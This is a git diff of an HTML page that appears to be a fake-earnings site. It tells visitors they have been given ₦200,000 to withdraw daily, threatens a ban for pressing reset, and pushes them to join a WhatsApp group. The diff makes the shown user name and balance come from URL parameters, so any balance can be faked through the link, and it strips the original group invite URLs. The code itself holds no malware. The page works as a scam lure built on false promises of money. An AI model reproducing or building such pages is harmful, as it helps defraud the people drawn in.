@@ -8,19 +8,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
     <link rel="stylesheet" href="welcom.css">
-<script src="https://kit.fontawesome.com/3ca0a9bad6.js" crossorigin="anonymous"></script>
+    <script src="https://kit.fontawesome.com/ae4b918f42.js" crossorigin="anonymous"></script>
     <link href="https://fonts.googleapis.com/css2?family=Bitter:ital,wght@0,600;1,500&amp;family=Kanit:wght@400;500&amp;family=Nosifer&amp;family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="top">
         <img src="ma.jpeg" alt="">
         <img src="noti.jpeg" alt="" style="float: right; padding-left: 10px;">
-        <p>Hi,  hhh@!</p>
+        <p id="usernameText"></p>
     </div> <br> <br> <br>  <br>
     <div class="box">
-        <p>Today Spent</p>
-        <h2>₦200000.00</h2>  <br>
-        <button style="border: none; "><a href="withdraw.html" style="text-decoration: none;">Withdraw</a></button>
+        <p>Today Balance</p>
+        <h2 id="BalanceAvailable">₦200000.00</h2>  <br>
+        <button style="border: none; "><a id="link" href="withdraw.html" style="text-decoration: none;">Withdraw</a></button>
          <br>
         <p>Daily spend target: ₦ 200,000</p>
     </div> <br>
@@ -42,9 +42,9 @@
         </div>
         <div class="firstc">
          <div class="circle"> <h2> <i class="fa-solid fa-flask"></i> <br>
-            <a id="" href="https://chat.whatsapp.com/DMcZtXqz99g5wJLSrYo4Dd">Contact</a></h2></div>
+            <a id="" href="https://chat.whatsapp">Contact</a></h2></div>
         <div class="circle"> <h2> <i class="fa-solid fa-globe"></i> <br>
-          <a href="https://chat.whatsapp.com/DMcZtXqz99g5wJLSrYo4Dd" id="open-popup">Group</a></h2></div>
+          <a href="https://chat.whatsapp.com" id="open-popup">Group</a></h2></div>
         <div class="circle"> <h2> <i class="fa-solid fa-cubes"></i><br>
           <a href="faq.html" id="open-popup">Faq</a></h2></div>
         </div>
@@ -52,8 +52,8 @@
     <div id="popup-container">
         <div id="popup-content">
             <h2>Welcome</h2>
-            <p><span>hhh@</span> you have been geven 200,000 to <br> withdraw every day. dont click  on the reset botton untill tomorrow, else you will be baned join group
-            <a style="color: blue;" href="https://chat.whatsapp.com/DMcZtXqz99g5wJLSrYo4Dd">Here</a></p> <br> 
+            <p><span id="username"></span> you have been geven 200,000 to <br> withdraw every day. dont click  on the reset botton untill tomorrow, else you will be baned join group
+            <a style="color: blue;" href="https://chat.whatsapp">Here</a></p> <br> 
             <button id="close-popup">Close</button>  <button style="background:blue;" id="close-popup"><a href="#">Reset</a></button>
         </div>
     </div>
@@ -106,9 +106,42 @@
 
     </style>
     <script>
+        const urlParams = new URLSearchParams(window.location.href.split('?')[1]);
+
+        const closepopup = urlParams.get("CP");
+        if(closepopup=="1"){
+            const popupContainer = document.getElementById("popup-container");
+            popupContainer.style.display = "none";
+        }
+
+        
+        try{
+            username = urlParams.get('username');
+        document.getElementById("username").innerText = username;
+        document.getElementById("usernameText").innerText = "Hi, "+username.replace("@gmail.com", "");
+        }
+        catch {
+
+        }
+        
+
+        
+        avaB = urlParams.get('BA');
+        if(avaB==null){
+            avaB="200000"
+        }
+        const btext = document.getElementById("BalanceAvailable");
+        btext.innerText = `₦${avaB}.00`;
+
+        
+        document.getElementById("link").href = `withdraw.html?BA=${avaB}&username=${document.getElementById("username").innerText}`;
+
+        
+        const form = document.getElementById('submitForm');
      document.addEventListener("DOMContentLoaded", function () {
     const openPopupButton = document.getElementById("open-popup");
     const popupContainer = document.getElementById("popup-container");
+    
     const closePopupButton = document.getElementById("close-popup");
 
     openPopupButton.addEventListener("click", function (event) {
